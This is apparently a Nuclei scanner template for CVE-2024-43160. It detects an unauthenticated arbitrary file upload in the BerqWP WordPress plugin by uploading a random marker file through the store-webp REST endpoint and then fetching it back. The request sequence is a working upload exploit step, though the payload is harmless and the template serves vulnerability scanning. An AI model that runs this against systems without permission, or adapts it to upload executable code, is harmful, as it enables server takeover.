flow: 'http(1) && http(2) && http(3)

  '
http:
- matchers:
  - condition: and
    dsl:
    - contains(body,"/wp-content/plugins/searchpro")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains(content_type,"application/json")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /wp-json/optifer/v1/store-webp HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    image="{{base64(num)}}"&url={{filename}}.txt&license_key_hash=d41d8cd98f00b204e9800998ecf8427e

    '
- matchers:
  - condition: and
    dsl:
    - contains(body,"{{num}}")
    - contains(content_type, "text/plain")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /{{filename}}.txt HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-43160
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-43160
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-434
    epss-percentile: 0.99122
    epss-score: 0.81173
  description: 'The BerqWP Automated All-In-One PageSpeed Optimization Plugin for
    Core Web Vitals, Cache, CDN, Images, CSS, and JavaScript plugin for WordPress
    is vulnerable to arbitrary file uploads due to missing file type validation in
    the /api/store_webp.php file in all versions up to, and including, 1.7.6. This
    makes it possible for unauthenticated attackers to upload arbitrary files on the
    affected site''s server which may make remote code execution possible.

    '
  impact: 'Unauthenticated attackers can upload arbitrary files to achieve remote
    code execution on the WordPress server.

    '
  metadata:
    framework: wordpress
    max-request: 3
    product: BerqWP
    publicwww-query: /wp-content/plugins/searchpro
    vendor: BerqWP
    verified: true
  name: BerqWP <= 1.7.6 - Arbitrary File Upload
  reference:
  - https://github.com/KTN1990/CVE-2024-43160
  - https://nvd.nist.gov/vuln/detail/CVE-2024-43160
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/searchpro/berqwp-176-unauthenticated-arbitrary-file-uplaod
  remediation: 'Update BerqWP plugin to version 1.7.7 or later.

    '
  severity: critical
  tags: cve,cve2024,file-upload,shell,intrusive,wp,wp-plugin,wordpress,searchpro,vuln
variables:
  filename: '{{rand_base(12)}}'
  num: '{{rand_int(10000000000, 999999999999999)}}'
